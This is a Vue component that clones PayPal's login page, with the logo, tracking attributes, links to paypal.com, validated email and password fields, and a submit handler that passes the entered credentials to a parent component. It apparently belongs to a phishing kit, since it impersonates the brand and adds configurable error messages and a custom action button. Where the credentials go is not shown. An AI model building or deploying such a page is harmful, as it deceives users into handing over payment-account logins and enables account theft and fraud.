<template>
  <section id="login" class="login" data-role="page" :data-title="language.title">
   <div class="corral">
      <div id="content" class="contentContainer activeContent contentContainerBordered">
         <header>
            <p class="paypal-logo paypal-logo-long"></p>
         </header>
         <h1 class="headerText accessAid">{{ language.title }}</h1>
         <p id="phoneSubTagLine" class="subHeaderText" :class="{'hide': subheaderText == '' || subheaderText == null || subheaderText == undefined}">{{ subheaderText }}</p>
         <div class="notifications">
           <p class="notification notification-critical" :class="{'hide': !submitError}" role="alert">{{ submitErrorMessage || language.inputError }}</p>
         </div>
         <form class="proceed maskable" autocomplete="off" name="login" novalidate="" v-on:submit.prevent="formSubmit">
            <div id="passwordSection" class="clearfix splitEmail">
               <div id="splitEmailSection" class="splitPhoneSection splitEmailSection">
                  <div class="textInput" :class="{'hasError': emailHasError}" id="login_emaildiv">
                    <div class="fieldWrapper ">
                      <label for="email" class="fieldLabel">{{ language.emailLabel }}</label>
                      <input id="email" name="login_email" type="email" class="hasHelp  validateEmpty" required="required" autocomplete="off" :placeholder="language.emailPlaceHolder" aria-describedby="emailErrorMessage" v-model="credentials.email" ref="emailInput">
                    </div>
                     <div class="errorMessage" :class="{'zindx': showEmailError, 'show': showEmailError}" id="emailErrorMessage">
                        <p class="emptyError" :class="{'hide': !emailEmptyError}">{{ language.required }}</p>
                        <p class="invalidError" :class="{'hide': !emailInvalidError}">{{ language.emailError }}</p>
                     </div>
                  </div>
               </div>
               <div id="passwordSection" class="clearfix">
                  <div class="textInput " :class="{'hasError': passwordHasError}" id="login_passworddiv">
                     <div class="fieldWrapper ">
                        <label for="password" class="fieldLabel">{{ language.passwordLabel }}</label>
                        <input id="password" name="login_password" :type="passwordInputType" class="hasHelp validateEmpty pin-password" required="required" :placeholder="language.passwordPlaceholder" aria-describedby="passwordErrorMessage" v-model="credentials.password" ref="passwordInput">
                        <button type="button" :class="{'hide': showPassword || credentials.password == ''}" class="showPassword show-hide-password scTrack:unifiedlogin-show-password" :aria-label="language.passwordShow" pa-marked="1" 
                        @click="togglePassword(true)">{{ language.passwordShow }}</button>
                        <button type="button" :class="{'hide': !showPassword || credentials.password == ''}" class="hidePassword show-hide-password scTrack:unifiedlogin-hide-password" :aria-label="language.passwordHide" pa-marked="1" 
                        @click="togglePassword(false)">{{ language.passwordHide }}</button>
                     </div>
                     <div class="errorMessage" :class="{'show': showPasswordError}" id="passwordErrorMessage">
                        <p class="emptyError" :class="{'hide': !showPasswordError}">{{ language.required }}</p>
                     </div>
                  </div>
               </div>
            </div>
            <div class="actions">
              <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1">{{ language.loginButton }}</button>
            </div>
         </form>
         <div class="forgotLink">
            <a href="//paypal.com/authflow/password-recovery" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1">{{ language.passwordRecovery }}</a>
         </div>
         <div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass="">
            <div class="loginSignUpSeparator"><span class="textInSeparator">{{ language.or }}</span></div>
            <a href="//paypal.com/webapps/mpp/account-selection" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1">{{ language.createAccount }}</a>
         </div>
         <div id="tpdButtonContainer" class="signupContainer" :class="{'hide': !showCustomAction}">
            <div class="loginSignUpSeparator"><span class="textInSeparator">of</span></div>
            <div class="actions">
                <button class="button secondary" id="tpdButton" type="submit" :value="customActionText" pa-marked="1" @click="onCustomActionClick">{{ customActionText }}</button>
            </div>
        </div>
      </div>
   </div>
</section>
</template>

<script>
export default {
  name: 'paypalMain',
  props: ['language', 'credentials', 'subheaderText', 'submitErrorMessage', 'submitError', 'showCustomAction', 'customActionText'],
  data () {
    return {
      emailInvalidError: false,
      emailEmptyError: false,

      emailHasError: false,
      passwordHasError: false,

      showEmailError: false,
      showPasswordError: false,

      showPassword: false,
      passwordInputType: 'password'
    }
  },
  methods: {
    togglePassword (show) {
      this.showPassword = show
      this.passwordInputType = show ? 'text' : 'password'
    },
    formSubmit (evt) {
      // Hide errors
      this.emailInvalidError = false
      this.emailEmptyError = false

      this.emailHasError = false
      this.passwordHasError = false

      this.showEmailError = false
      this.showPasswordError = false

      // Check valid email
      if (!this.isValidPhone(this.credentials.email) && !this.isValidEmail(this.credentials.email)) {
        this.emailInvalidError = true
        this.showEmailError = true
        this.emailHasError = true
        this.$refs.emailInput.focus()
        return
      }
      // Check empty email
      if (this.credentials.email == '') {
        this.emailEmptyError = true
        this.showEmailError = true
        this.emailHasError = true
        this.$refs.emailInput.$el.focus()
        return
      }
      // Check empty password
      if (this.credentials.password == '') {
        this.showPasswordError = true
        this.passwordHasError = true
        this.$refs.passwordInput.focus()
        return
      }
      this.$emit('submit-credentials')
    },
    onClickAway () {
      this.showEmailError = false
      this.showPasswordError = false
    },
    isValidEmail (email) {
      return /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(email)
    },
    isValidPhone (phone) {
      return (/^\d{7,}$/).test(phone.replace(/[\s()+\-\.]|ext/gi, ''));
    },
    onCustomActionClick () {
      this.$emit('custom-action-click')
    }
  },
  mounted () {
    this.$el.addEventListener('click', this.onClickAway)
  },
  beforeDestroy () {
    this.$el.removeEventListener('click', this.onClickAway)
  },
}
</script>

<style>
  .zindx {
    z-index: 4;
  }
  .errorMessage {
    transition: none;
  }
</style>